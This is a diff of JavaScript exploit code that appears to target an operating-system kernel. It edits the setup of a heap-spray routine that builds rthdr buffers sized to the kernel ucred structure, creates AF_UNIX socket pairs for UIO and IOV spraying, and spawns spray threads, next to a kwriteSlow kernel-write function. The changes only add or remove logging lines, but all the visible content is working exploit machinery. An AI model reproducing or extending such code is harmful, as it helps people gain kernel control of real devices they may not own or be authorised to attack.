@@ -723,24 +723,16 @@ function kwriteSlow(addr, buffer) {
 
 function performSetup() {
     try {
-
-	
-		
         iovState = new WorkerState(IOV_THREAD_NUM);
         uioState = new WorkerState(UIO_THREAD_NUM);
+		
         // Prepare spray buffer
        sprayRthdrLen = buildRthdr(sprayRthdr, UCRED_SIZE);
-
-			log("msgIov.address():", msgIov.address());
 		
-		
-    log("dummyBuffer.address():", dummyBuffer.address());
         // Prepare msg iov buffer
         msg.putLong(0x10, msgIov.address()); // msg_iov
         msg.putLong(0x18, MSG_IOV_NUM);      // msg_iovlen
-	
-	
-		
+
         dummyBuffer.fill(0x41);
         uioIovRead.putLong(0x00, dummyBuffer.address());
         uioIovWrite.putLong(0x00, dummyBuffer.address());
@@ -756,17 +748,22 @@ function performSetup() {
            log("failed realtime priority");
            return false;
      }
-
+		
+      log("Create socket pair for UIO spraying");
+		
         // Create socket pair for UIO spraying
         socketpair(AF_UNIX, SOCK_STREAM, 0, uioSs);
         uioSs0 = uioSs.get(0);
         uioSs1 = uioSs.get(1);
-
+   
+		log("Create socket pair for IOV spraying");
+		
         // Create socket pair for IOV spraying
         socketpair(AF_UNIX, SOCK_STREAM, 0, iovSs);
         iovSs0 = iovSs.get(0);
         iovSs1 = iovSs.get(1);
 
+		 	log("Create IOV threads");
         // Create IOV threads
         for (let i = 0; i < IOV_THREAD_NUM; i++) {
             iovThreads[i] = new IovThread(iovState);
@@ -1461,6 +1458,7 @@ class WorkerState {
 }
 
 main();
+
 
 
 
